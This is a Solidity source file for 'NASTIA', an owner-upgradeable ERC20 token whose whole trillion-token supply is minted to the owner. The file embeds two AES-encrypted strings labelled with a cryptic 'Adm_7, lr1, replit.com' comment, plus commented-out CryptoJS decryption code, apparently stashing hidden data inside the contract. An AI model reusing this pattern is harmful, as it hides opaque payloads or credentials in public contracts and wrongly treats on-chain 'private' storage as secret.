// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

import "./ERC20Upgradeable.sol";
import "./Initializable.sol";
import "./OwnableUpgradeable.sol";
import "./UUPSUpgradeable.sol";

contract NASTIA is Initializable, ERC20Upgradeable, OwnableUpgradeable, UUPSUpgradeable {

    string[] public stringArray;

    //Adm_7, lr1, replit.com
    string private k1 = "U2FsdGVkX19osnewcdrV46TYYaln0v03UjEvOeBchRBqW+b0E7Z1A2nKw2RW8Q1ZjymSihqSOuAisgX8vQ6JVA==";
    string private k2 = "U2FsdGVkX1+8O8thN0t1ahka032VbYXacpASn6m4sbw42y21WPHpBdsW0013vOnq";

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        initialize();
        _disableInitializers();
    }

    function initialize() initializer public {
        __ERC20_init("NASTIA", "NASTIA");
        __Ownable_init();
        _mint(owner(), 1_000_000_000_000 * 1e18);
        __UUPSUpgradeable_init();
    }

    function _authorizeUpgrade(address newImplementation)
        internal
        onlyOwner
        override
    {}

    // Add a string to the array
    function addString(string memory newString) public {
        stringArray.push(newString);
    }

    // Get the length of the array
    function getStringArrayLength() public view returns (uint) {
        return stringArray.length;
    }

    // Get a specific string by index
    function getStringAtIndex(uint index) public view returns (string memory) {
        require(index < stringArray.length, "Index out of bounds");
        return stringArray[index];
    }
    
    /*
    const CryptoJS = require('crypto-js');
    const bytes = CryptoJS.AES.decrypt(ciphertext, pwd);
    const decryptedText = bytes.toString(CryptoJS.enc.Utf8);
    */
}